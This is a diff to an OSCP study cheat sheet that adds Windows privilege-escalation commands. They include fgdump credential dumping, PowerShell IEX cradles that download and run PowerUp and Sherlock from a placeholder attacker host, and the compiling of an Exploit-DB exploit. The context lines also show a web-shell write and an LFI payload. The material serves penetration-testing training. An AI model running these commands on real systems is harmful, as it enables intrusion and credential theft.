@@ -1,4 +1,4 @@
-# OSCP-shortsheet
+![image](https://github.com/redcountryroad/OSCP-shortsheet/assets/166571565/e0853f27-170c-4c57-83df-e1cbbc04c20e)# OSCP-shortsheet
 - 🚀 Prepared as part of my OSCP journey.
 
 #Resources
@@ -255,8 +255,61 @@ SELECT "" into outfile "C:\\xampp\\htdocs\\shell.php"
 
 #LFI reverse shell
 http://x.x.x.x/blah?parameter=/etc/passwd%00
-
 ```
+
+# Window Priv Esc
+## Enumeration
+### User
+```bash
+#which user
+whoami
+
+#what privilege
+whoami /priv
+
+#what other users
+net users
+
+#check for admin privilege
+net localgroup administrators
+
+#list all saved creds from Credential Manager
+cmdkey /list
+
+#users who are logged in in current session
+qwinsta
+```
+
+### Password
+```
+#fgdump.exe
+/usr/share/windows-binaries/fgdump/fgdump.exe
+C:\> fgdump.exe
+C:\> type 127.0.0.1.pwdump
+```
+
+### Use Powerup https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1
+```bash
+IEX(New-Object Net.Webclient).downloadString('http://x.x.x.x:8000/PowerUp.ps1')
+powershell.exe -nop -exec bypass
+PS C:\> Import-Module .\PowerUp.ps1
+PS C:\> Invoke-AllChecks
+```
+
+### Use Sherlock https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1 
+```bash
+IEX(New-Object Net.Webclient).downloadString('http://x.x.x.x:8000/Sherlock.ps1')
+powershell.exe -nop -exec bypass
+PS C:\> Import-Module .Sherlock.ps1
+PS C:\> Find-AllVulns
+```
+
+### Windows Exploits DB
+- https://github.com/SecWiki/windows-kernel-exploits
+- https://github.com/abatchy17/WindowsExploits
+
+# Linux Priv Esc
+## Enumeration
 
 
 # Active Directory Pentesting
@@ -667,3 +720,11 @@ proxychains -q impacket-smbexec domain\user:password -target-ip  10.0.60.99
 proxychains -q evil-winrm -i 10.0.60.99 -u 'domain\user' -p 'password'
 
 ```
+
+## compiling windows exploit on kali
+```bash
+apt install mingw-w64
+i686-w64-mingw32-gcc /usr/share/exploitdb/exploits/windows/dos/42341.c -o syncbreeze_exploit.exe -lws2_32
+```
+
+
